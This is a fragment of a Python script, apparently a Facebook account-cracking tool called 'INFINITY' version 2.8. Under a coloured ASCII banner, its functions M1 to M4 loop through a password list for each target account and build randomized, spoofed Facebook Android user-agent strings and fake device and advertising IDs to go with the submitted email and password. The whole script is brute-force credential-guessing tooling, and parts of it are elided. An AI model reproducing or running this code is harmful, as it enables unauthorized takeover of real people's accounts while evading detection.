...
logo=(f"""\033[1;37m
\033[1;36m d888888b d8b   db d88888b d888888b d8b   db 
\033[1;36m   `88'   888o  88 88'        88'   888o  88 
\033[1;31m    88    88V8o 88 88ooo      88    88V8o 88 
 \033[1;36m   88    88 V8o88 88===      88    88 V8o88 
\033[1;36m   .88.   88  V888 88        .88.   88  V888 
\033[1;36m Y888888P VP   V8P YP      Y888888P VP   V8P
                      \033[1;31m   INFINITY
\033[1;32m══════════════════════════════════════════════
...
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;32mVERSION \033[1;32m: 2.8
\033[1;32m═════════════════════════════════════""")
def linex():
    print('\033[1;32m══════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/174.0.0.2765;FBPN/com.facebook.orca;FBLC/en_CU;FBBV/846609595;FBCR/Satcom;FBMF/samsung;FBBD/samsung;FBDV/SM-J510FN|NMF26X;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.5,width=1435,height=1282};FB_FW/1;FBRV/846609595]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/112.0.0.2821;FBPN/com.facebook.orca;FBLC/zh_CN;FBBV/620639228;FBCR/Almadar;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F|LMY47V;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1062,height=1784};FB_FW/1;FBRV/620639228]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/163.3.92.99;FBBV/82015261;FBDM/{density=2.7,width=1151,height=2348};FBLC/en_US;FBRV/70504112;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
...
def M4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/235.0.0.36.235;FBBV/853698759;FBDM/{density=1.0,width=1054,height=2113};FBLC/it_IT;FBCR/IIJmio;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/Huawei P10;FBSV/11.1.1;nullFBCA/arm64-v8a:;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
